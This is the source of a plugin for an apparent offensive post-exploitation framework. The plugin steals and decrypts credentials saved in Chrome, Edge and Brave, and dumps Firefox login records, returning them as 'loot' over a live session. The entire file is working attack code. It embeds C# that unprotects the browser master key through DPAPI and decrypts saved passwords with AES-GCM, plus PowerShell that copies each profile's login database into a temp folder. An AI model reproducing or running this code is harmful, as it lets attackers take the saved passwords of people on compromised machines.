"""credential_access/browser_creds — extract and decrypt browser credentials. MITRE T1555.003"""
from fitnah.sdk import BasePlugin, ModuleResult, mitre
from fitnah.sdk.schema import Param, ParamSchema


class BrowserCreds(BasePlugin):
    NAME        = "browser_creds"
    DESCRIPTION = "Extract Chrome/Edge/Brave/Firefox creds; decrypt AES-256-GCM (v80+) via DPAPI."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1555.003"
    CATEGORY    = "credential_access"

    schema = ParamSchema().add(
        Param("browser", str,  required=False, default="all",  help="chrome|edge|brave|firefox|all"),
        Param("decrypt", bool, required=False, default=True,   help="Attempt DPAPI decryption of passwords"),
    )

    # C# type for DPAPI + AES-GCM decryption (Chromium v80+)
    _CS_DECRYPT = (
        "using System;"
        "using System.Security.Cryptography;"
        "using System.Text;"
        "public class ChromeDecrypt {"
        "  public static byte[] DPAPI(byte[] data) {"
        "    return ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser);"
        "  }"
        "  public static string DecryptPassword(byte[] encPwd, byte[] masterKey) {"
        "    try {"
        "      if (encPwd.Length < 15) return \"[too short]\";"
        "      string prefix = Encoding.ASCII.GetString(encPwd, 0, 3);"
        "      if (prefix == \"v10\" || prefix == \"v11\") {"
        "        byte[] nonce = new byte[12];"
        "        Array.Copy(encPwd, 3, nonce, 0, 12);"
        "        int ctLen = encPwd.Length - 3 - 12 - 16;"
        "        if (ctLen < 0) return \"[invalid len]\";"
        "        byte[] ct  = new byte[ctLen + 16];"
        "        Array.Copy(encPwd, 15, ct, 0, ctLen + 16);"
        "        using (AesGcm aes = new AesGcm(masterKey)) {"
        "          byte[] plain = new byte[ctLen];"
        "          byte[] tag   = new byte[16];"
        "          Array.Copy(ct, ctLen, tag, 0, 16);"
        "          byte[] ciphertext = new byte[ctLen];"
        "          Array.Copy(ct, 0, ciphertext, 0, ctLen);"
        "          aes.Decrypt(nonce, ciphertext, tag, plain);"
        "          return Encoding.UTF8.GetString(plain);"
        "        }"
        "      } else {"
        "        byte[] plain = ProtectedData.Unprotect(encPwd, null, DataProtectionScope.CurrentUser);"
        "        return Encoding.UTF8.GetString(plain);"
        "      }"
        "    } catch (Exception ex) { return \"[decrypt_err:\" + ex.Message + \"]\"; }"
        "  }"
        "}"
    )

    @mitre("T1555.003")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        browser_filter = params.get("browser", "all").lower()
        do_decrypt     = bool(params.get("decrypt", True))

        cs_src = self._CS_DECRYPT

        ps = (
            "Add-Type -TypeDefinition '" + cs_src + "'"
            " -Language CSharp"
            " -ReferencedAssemblies System.Security,System.Core 2>$null;"
            "$tmp = \"$env:TEMP\\bcreds_$(Get-Random)\";"
            "New-Item -ItemType Directory -Path $tmp -Force | Out-Null;"
            "$results = @();"
            "$results += \"{0,-45} {1,-30} {2}\" -f 'URL','Username','Password';"
            "$results += \"{0,-45} {1,-30} {2}\" -f ('-'*45),('-'*30),('-'*20);"

            # Browser map
            "$allBrowsers = @{"
            "  chrome = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\";"
            "  edge   = \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\";"
            "  brave  = \"$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\";"
            "};"

            # Filter selection
            "$targets = if ('" + browser_filter + "' -eq 'all') { $allBrowsers }"
            " else { @{'" + browser_filter + "' = $allBrowsers['" + browser_filter + "']} };"

            "foreach ($b in $targets.GetEnumerator()) {"
            "  $bName = $b.Key; $base = $b.Value;"
            "  if (-not (Test-Path $base)) { $results += \"[-] $bName not found\"; continue };"

            # Read master AES key from Local State
            "  $masterKey = $null;"
            "  $ls = \"$base\\Local State\";"
            "  if (Test-Path $ls) {"
            "    try {"
            "      $lsJson = Get-Content $ls -Raw | ConvertFrom-Json;"
            "      $encKeyB64 = $lsJson.os_crypt.encrypted_key;"
            "      if ($encKeyB64) {"
            "        $encKeyBytes = [System.Convert]::FromBase64String($encKeyB64);"
            "        $dpapi = $encKeyBytes[5..($encKeyBytes.Length-1)];"
            "        $masterKey = [ChromeDecrypt]::DPAPI($dpapi);"
            "        $results += \"[+] $bName master key: OK (\" + $masterKey.Length + \" bytes)\";"
            "      };"
            "    } catch { $results += \"[!] $bName LocalState error: $_\" };"
            "  };"

            # Enumerate profiles
            "  $profiles = @('Default') + (Get-ChildItem $base -Directory -EA SilentlyContinue"
            "    | Where-Object { $_.Name -match '^Profile \\d+$' } | Select-Object -ExpandProperty Name);"

            "  foreach ($prof in $profiles) {"
            "    $db = \"$base\\$prof\\Login Data\";"
            "    if (-not (Test-Path $db)) { continue };"
            "    $dst = \"$tmp\\${bName}_${prof}\";"
            "    New-Item -ItemType Directory -Path $dst -Force | Out-Null;"
            "    robocopy \"$base\\$prof\" $dst 'Login Data' /NJH /NJS /NFL /NDL 2>&1 | Out-Null;"
            "    $copy = \"$dst\\Login Data\";"
            "    if (-not (Test-Path $copy)) {"
            "      try { Copy-Item $db $copy -Force -EA Stop }"
            "      catch { $results += \"[-] $bName/$prof copy failed\"; continue };"
            "    };"

            # Load System.Data.SQLite via managed code if available, else raw byte scan
            "    try {"
            "      Add-Type -Path 'System.Data.SQLite.dll' -EA Stop;"
            "      $conn = New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$copy;Version=3;Read Only=True;\");"
            "      $conn.Open();"
            "      $cmd = $conn.CreateCommand();"
            "      $cmd.CommandText = 'SELECT origin_url,username_value,password_value FROM logins';"
            "      $rdr = $cmd.ExecuteReader();"
            "      while ($rdr.Read()) {"
            "        $url  = $rdr.GetString(0);"
            "        $user = $rdr.GetString(1);"
            "        $encPwd = $rdr[2] -as [byte[]];"
            "        $pwd = if ('" + ("true" if do_decrypt else "false") + "' -eq 'true' -and $encPwd -and $masterKey) {"
            "          [ChromeDecrypt]::DecryptPassword($encPwd, $masterKey)"
            "        } elseif ('" + ("true" if do_decrypt else "false") + "' -eq 'true' -and $encPwd) {"
            "          [ChromeDecrypt]::DecryptPassword($encPwd, $null)"
            "        } else { '[encrypted]' };"
            "        $results += \"{0,-45} {1,-30} {2}\" -f $url.Substring(0,[Math]::Min(44,$url.Length)),$user,$pwd;"
            "      };"
            "      $rdr.Close(); $conn.Close();"
            "    } catch {"
            # Fallback: raw byte scan for URLs + usernames
            "      $bytes = [System.IO.File]::ReadAllBytes($copy);"
            "      $enc = [System.Text.Encoding]::UTF8;"
            "      $marker = $enc.GetBytes('action_url');"
            "      $count = 0;"
            "      for ($i = 0; $i -lt ($bytes.Length - $marker.Length) -and $count -lt 20; $i++) {"
            "        $ok = $true;"
            "        for ($j = 0; $j -lt $marker.Length; $j++) {"
            "          if ($bytes[$i+$j] -ne $marker[$j]) { $ok = $false; break };"
            "        };"
            "        if ($ok) {"
            "          $s = [Math]::Max(0,$i-200);"
            "          $txt = $enc.GetString($bytes,$s,[Math]::Min(500,$bytes.Length-$s)) -replace '[^\\x20-\\x7E]',' ';"
            "          $urls = [regex]::Matches($txt,'https?://[^\\s<>\"]{5,60}');"
            "          foreach ($u in $urls) { $results += \"{0,-45} {1,-30} {2}\" -f $u.Value.TrimEnd(' ,;'),'[scan-only]','[raw-bytes]'; $count++ };"
            "        };"
            "      };"
            "    };"
            "  };"
            "};"

            # Firefox
            "$ffBase = \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\";"
            "if (('" + browser_filter + "' -eq 'all' -or '" + browser_filter + "' -eq 'firefox') -and (Test-Path $ffBase)) {"
            "  $results += '';"
            "  $results += '--- Firefox (NSS-encrypted; raw field dump) ---';"
            "  $ffProfs = Get-ChildItem $ffBase -Directory -EA SilentlyContinue;"
            "  foreach ($p in $ffProfs) {"
            "    $lk = \"$($p.FullName)\\logins.json\";"
            "    $k4 = \"$($p.FullName)\\key4.db\";"
            "    if (Test-Path $lk) {"
            "      $results += \"[+] Firefox logins.json: $lk\";"
            "      try {"
            "        $logins = (Get-Content $lk -Raw | ConvertFrom-Json).logins;"
            "        foreach ($login in ($logins | Select-Object -First 20)) {"
            "          $results += \"  hostname:       \" + $login.hostname;"
            "          $results += \"  encryptedUsername: \" + $login.encryptedUsername;"
            "          $results += \"  encryptedPassword: \" + $login.encryptedPassword;"
            "          $results += '';"
            "        };"
            "      } catch { $results += \"  [!] Parse error: $_\" };"
            "    };"
            "    if (Test-Path $k4) { $results += \"[+] Firefox key4.db : $k4\" };"
            "  };"
            "};"

            "$results += '';"
            "$results += \"Temp: $tmp\";"
            "$results -join \"`n\""
        )

        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"], loot_kind="browser_creds")
